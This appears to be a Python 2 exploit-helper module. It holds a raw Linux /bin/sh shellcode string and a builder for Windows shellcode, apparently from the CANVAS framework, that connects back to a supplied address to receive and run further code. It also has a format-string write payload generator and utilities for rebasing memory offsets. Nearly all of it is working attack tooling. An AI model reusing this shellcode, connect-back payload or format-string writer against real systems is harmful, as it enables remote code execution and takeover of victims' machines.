#!/usr/bin/python

import sys,struct
import socket,select

def int32(i): return struct.pack('<I',i)
def byte32(s): return struct.unpack('<I',s)[0]

sc_binsh='1\xc0\xeb\x02\xeb\x0c\xe8\xf9\xff\xff\xff/bin/sh[\x8dK\x08\x88A\xff\x89\x19\x8dQ\x04\x89\x02\x04\x0b\xcd\x80'

def sc_mkwin32canvas(localaddr,badstring,subesp=0):
	import sys
	sys.path.append("shellcode")
	import shellcodeGenerator
	from canvasexploit import canvasexploit
	sc=shellcodeGenerator.win32()

	sc.addAttr("findeipnoesp",{"subespval": 0x400}) #don't mess with eip
	sc.addAttr("revert_to_self_before_importing_ws2_32", None)


#sc.addAttr("BindMosdef", {"port" : 12331 })
	sc.addAttr("tcpconnect", {"port" : localaddr[1], "ipaddress" : localaddr[0]})
	sc.addAttr("RecvExecWin32",{"socketreg": "FDSPOT"}) #MOSDEF
	sc.addAttr("ExitThread",None)

	return canvasexploit().intel_encode(badstring,sc.get())

def fmt_calc(addr,data,addr_pos,prefix="",char="n"):
	addrs=[]
	prints=[]
	prnlen=len(prefix)+4*len(data)
	for idx,c in enumerate(map(lambda x: ord(x),data)):
		addrs.append(struct.pack("<I",addr+idx))
		toprint=256+c-(prnlen%256)
		if toprint>256: toprint=toprint%256
		prints.append("%%%dc%%%d$%s"%(toprint,addr_pos+idx,char))
		prnlen=toprint+prnlen
	ret="%s%s%s"%(prefix,"".join(addrs),"".join(prints))
	return ret

class RelOffs(object):
	def __init__(self,**vals):
		self._vals=vals
	def __getattr__(self,key):
		if not key.startswith("_") and key in self._vals: return self._vals[key]
		return object.__getattribute__(self,key)
	def __setattr__(self,key,val):
		if not key.startswith("_"): self._vals[key]=val
		object.__setattr__(self,key,val)
	def __repr__(self): return "<%s.%s %s>"%(self.__class__.__module__,self.__class__.__name__," ".join(["%s=0x%x"%(k,v) for k,v in self._vals.iteritems()]))
	def rebase(self,**refptr):
		k,v=refptr.items()[0]
		diff=v-self._vals[k]
		newvals=dict([(k,v+diff) for k,v in self._vals.iteritems()])
		for k,v in refptr.iteritems():
			if newvals[k]!=v: raise ValueError,"Relative values do not match(%s): 0x%08x != 0x%08x"%(k,v,newvals[k])
		self._vals=newvals

def as_shargs(*l):
	return " ".join(["$'%s'"%e for e in map(lambda x: x.encode("string_escape"),l)])


if __name__=='__main__':
	import user
